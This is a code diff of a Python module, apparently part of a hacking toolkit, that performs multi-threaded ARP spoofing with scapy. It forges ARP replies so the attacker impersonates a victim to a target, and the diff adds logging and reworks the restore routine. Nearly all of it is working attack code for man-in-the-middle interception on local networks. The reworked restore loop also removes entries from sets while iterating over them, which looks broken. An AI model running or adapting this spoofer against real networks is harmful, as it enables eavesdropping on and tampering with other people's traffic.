@@ -1,15 +1,14 @@
 import time
 import scapy.all as scapy
 from threading import Thread, Event
-from lib import logger as _
+from datas import logger as _
 
 log = _.log
 
 # execute arp spoofing (is Multi-threaded)
 class Spoofer(Thread):
 	pkts	= []
-	targets = []
-
+	targets = set()
 	# We know our mac and ip already let save them
 	def __init__(self, host, delay = 1):
 		super(Spoofer, self).__init__()
@@ -18,28 +17,31 @@ class Spoofer(Thread):
 		self.delay = delay
 
 	# restoring real MACs
-	def restore(self, target):
-		pkt = scapy.ARP(op=2, pdst=target, hwdst=target.mac, psrc=self.host[0], hwsrc=self.host[1])
-		scapy.send(pkt, verbose=False)
-		# delete the value from the instance
-
-	# get the mac from the network
-	#def get_mac(self, ip):
-	#	True
+	def restore(self):
+		for t in self.targets:
+			for v in t.victims:
+				pkt = scapy.ARP(op=2, pdst=v.ip, hwdst=v.mac, psrc=self.host[0], hwsrc=self.host[1])
+				scapy.send(pkt, verbose=False)
+				t.victims.remove(v)
+			self.targets.remove(t)
 
 	# We'll send the packet to the target by pretending being the victim
 	def spoof(self, victim, target):
-		#target_mac = self.get_mac(victim)
-		self.targets.append(victim)
+		if not target in self.targets:
+			self.targets.add(target)
+		log.print("dst: {} {} src: {} {}".format(target.mac, target.ip, victim.ip, victim.mac))
 		self.pkts.append(scapy.ARP(op=2, hwdst=target.mac, pdst=target.ip, psrc=victim.ip))
 
 	# Thread routine
 	def run(self):
+		log.print("Start spoofing...")
+		log.print("prepared packets: {}".format(len(self.pkts)))
 		self.exit.clear()
 		try:
 			while not self.exit.is_set():
 				for spoof in self.pkts:
 					scapy.sendp(spoof, verbose=False)
+					log.print("spoof", spoof.show())
 				time.sleep(self.delay)
 		except KeyboardInterrupt or self.exit.is_set():
 			for key in self.targets:
@@ -47,6 +49,6 @@ class Spoofer(Thread):
 
 	# Fire the stop event
 	def stop(self):
-		self.exit.set();
 		log.print("ARP Spoofing stopping, waiting 1 second...")
+		self.exit.set();
 		time.sleep(1)
